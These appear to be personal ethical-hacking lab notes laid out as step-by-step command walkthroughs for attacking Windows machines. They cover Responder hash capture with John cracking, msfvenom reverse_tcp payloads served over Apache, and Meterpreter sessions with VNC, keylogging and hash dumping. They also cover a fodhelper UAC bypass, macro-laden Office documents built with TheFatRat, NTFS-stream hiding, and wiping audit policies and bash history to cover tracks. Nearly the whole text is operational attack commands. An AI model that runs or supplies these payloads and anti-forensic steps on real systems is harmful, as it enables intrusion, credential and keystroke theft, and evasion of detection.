---Responder (For Windows password  cracking)---
Link-Local Multicast Name Resolution (LLMNR) and Netbios Name Service (NBT-NS) are two components of Microsoft Windows machines. 
LLMNR was introduced in Windows Vista and is the successor to NBT-NS.

Kali Linux > responder -I eth0 [responder will be listening to events]
Switch to Windows : Run \\anylocation
Switch to Kali Linux > observe the logs. Go to /usr/share/responder/logs/<log-file>
kali linux > john /usr/share/responder/logs/<log-file> [note the cracked password]
(If john is not installed then :-  sudo snap install john-the-ripper )
----END----

----------- Gaining Access ---- Exploiting Client Side Vulnerabilities and Establishing a VNC session-----------
[Creates malicious payload]
Kali Linux > msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=<IP_add_kali_Machine> LPORT=444 -o /root/Desktop/Test.exe 

[Share the file to the target machine]
Create a directory on html folder:
mkdir /var/www/html/share/

Change the mode for the share to 755:
chmod -R 755 /var/www/html/share/

Change the ownership of that folder to www-data:
chown -R www-data:www-data /var/www/html/share/

Now copy the malicious file to the shared location:
cp /root/Desktop/Test.exe /var/www/html/share/

Next, start the apache service:
service apache2 start

Open a new terminal window and type msfconsole to launch Metasploit Framework.
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <kali_ip>
> set LPORT 444
> run

~~Switch to Windows Machine
open firefox http://<kali_ip>/share , download the Test.exe and run

~~Switch back to Kali Machine
check if there is any session that are opened in the Meterpreter Shell
meterpreter > sysinfo [should show the target systems information]
meterpreter > run vnc [kick starts remote session]
------------ END -------------------------------------------

------ Escalating Privileage----------------------------------
To create the malicious executable file, type this command and put your Kali IP address on LHOST option:
> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<kali_ip> -f exe > Desktop/Exploit.exe

Create a new directory inside html folder:
mkdir /var/www/html/share/

Change the mode for the share to 755:
chmod -R 755 /var/www/html/share/

Change the ownership of that folder to www-data:
chown -R www-data:www-data /var/www/html/share/
cp /root/Desktop/Exploit.exe /var/www/html/share/

Start the apache service to run the http server:
service apache2 start

Perform Exploitation
-----
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp

set LHOST <kali_ip>

Start the exploit on background:

exploit -j -z

~~Switch to Windows Machine
open firefox http://<kali_ip>/share , download the Exploit.exe and run

~~Switch back to Kali Machine
meterpreter > sessions -i [to list the current sessions opened]
meterpreter > sessions <ID> [select the sessionID]
getuid
run post/windows/gather/smart_hashdump  [[-] Insufficient privileges to dump hashes!]

Try to escalate the privileges by issuing a getsystem command that attempts to elevate the user privileges.
getsystem -t 1 [priv_elevate_getsystem: Operation failed: Access is denied.]

Perform Previlege Escalation
--------
Move the current Meterpreter session to the background
meterpreter> background  

Use the bypassuac_fodhelper exploit for Windows:
> use exploit/windows/local/bypassuac_fodhelper

> sessions [fetch Session ID]
> set SESSION <ID>
> run
meterpreter > getsystem -i 1

meterpreter > getuid  [Server username: NT AUTHORITY\SYSTEM]
> run post/windows/gather/smart_hashdump
> clearev [Clear logs]
---------------------------END-----------------

-----------------------------------Hacking Windows with Malicious Office Document using TheFatRat------------------------------------
Kali Linux
> fatrat
> choose [06] Create Fud Backdoor 1000% with PwnWindws [Excelent]
> choose the [3] Create exe file with apache + Powershell (FUD 100%) 
> Set the LHOST IP: Kali IP; LPORT: 4444 and the output: payload
> chose [3] windows/meterpreter/reverse_tcp [Enter, fatrat will generate a payload.exe file located on /root/Fatrat_Generated/]

~~~~Make a Malicious Word File
> choose [9] Back to menu
> choose the [07] Create Backdoor For Office with Microsploit
> choose [2] The Microsoft Office Macro on Windows

> LHOST IP: [Your Kali IP]
> LPORT: 4444
> Enter the base name for output files: <BadDoc>
> Enter the message for the document body: you have been hacked :)
> custom exe to file backdoor. Choose y for yes
> path : /root/Fatrat_Generated/payload.exe
> On the Payload Option, choose the [3] windows/meterpreter/reverse_tcp

~~~~Set Up a Listener
Open another Kali Linux terminal
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <kali_ip>
> set LPORT 4444
> run

~~~~Share the Malicious Doc File
Open another Kali Linux terminal
> cp /root/Fatrat_Generated/BadDoc.docm /var/www/html/share/
> service apache2 start

~~Switch to Windows Machine
open firefox http://<kali_ip>/share , download the BadDoc.docm and open. Enable Editing . Enable Content

~~Switch back to Kali Machine where you had executed the msfconsole commands
You will find that have a Meterpreter session open in the Metasploit terminal
Type below commands to prove the hacking.
meterpreter > sysinfo [should show the target systems information]
meterpreter > run vnc [kick starts remote session]

-----------------------------------------------------------------END--------------------------------------------------------------

-----------------------------------Backdoor Technique / Hacking Windows using Metasploit------------------------------------------

~~~~Create the Backdoor.exe
Kali Linux
> msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=<kali_ip> -f exe > /root/Desktop/Backdoor.exe

Kali Linux
Share the Backdoor.exe
If you didn't have apache2 installed, type: apt-get install apache2

Copy the Backdoor.exe to the /www/html/share/ folder which will be visible from the web:
> cp /root/Desktop/Backdoor.exe /var/www/html/share/

Start the Apache services:
> service apache2 start
If you didn't have apache2 installed, type: apt-get install apache2

~~~~Set Up a Listener
Open another Kali Linux terminal
> msfconsole
> use multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <kali_ip>
> set LPORT 4444
To start the handler on the background, type:
> expoit -j -z

~~Switch to Windows Machine
open firefox http://<kali_ip>/share , download the backdoor.exe and run

~~Switch back to Kali Machine where you had executed the msfconsole commands
You will find that have a Meterpreter session open in the Metasploit terminal
Type below commands to prove the hacking.
meterpreter > sysinfo [should show the target systems information]
meterpreter > run vnc [kick starts remote session]

To get the user that the server is running as, type:
> getuid

Access a file
meterpreter > cd Desktop 
meterpreter > ls
meterpreter > cat <file_name>

To view the mace attributes of passwords.txt, type:
> timestomp <file_name> -v
> download <file_name>

Locating files with Search
> search -f pagefile.sys

Log all the Key strokes
meterpreter > keyscan_start

~~~Switch to the Windows 10, create a text file and type something:

~~~Switch back to the Kali Linux and dump the captured Keystrokes, by typing:
> keyscan_dump

You can see the number of seconds for which the user has been idle on the remote system, by typing:
> idletime

You may shut down the target machine after performing post exploitation, by typing:
> shutdown


------------------------------------------------------------------END-------------------------------------------------------------

-------------------------------------Hiding Files using NTFS streams (Windows)-----------------------
Open Windows Explorer and create a new folder called trick inside the C: drive.
Go to C:\windows\system32 and copy the calc.exe to the trick folder.

Launch the command prompt as Administrator, and navigate to C:\trick.
cd C:\trick

Create a readme.txt file, type Hello World inside of it and save the file.
notepad readme.txt

Back to command prompt and type dir to list the files on the current folder. Note the file size of readme.txt.

Now hide calc.exe inside the readme.txt by typing:
type c:\trick\calc.exe > c:\trick\readme.txt:calc.exe

Type dir again and note the file size of readme.txt did not change.

Back to the c:\trick and delete the calc.exe.

~~~~Execute the Hidden Application
Create a symlink: mklink backdoor.exe readme.txt:calc.exe

Execute the backdoor.exe by typing: backdoor.exe

------------------------------------------------END----------------------------------------------------

---------------------------Windows Audit Clearing----------------------------------
Launch Command Prompt from the Windows Server and type:
auditpol /get /category:*

To enable the audit policies, type:
auditpol /set /category:"system","account logon" /success:enable /failure:enable

To check whether audit policies are enable, type:
auditpol /get /category:*

To clear the audit policies, type:
auditpol /clear /y

To check whether audit policies are enable, type:
auditpol /get /category:*
---------------------------------------END--------------------------------------

-------------------------------------------LINUX Audit Clearing-----------------
> more ~/.bash_history [See the history of commands]

> history -c [Clear the stored history in the current terminal.]

> export HISTSIZE=0 [Disable the BASH shell from saving the history.HISTSIZE: determines the number of commands to be saved, which will be set to 0.]

> shred ~/.bash_history [Shred the history file, making its content unreadable.]

> shred ~/.bash_history && cat /dev/null > .bash_history && history -c && exit
-----------------------------------------------END-------------------------------


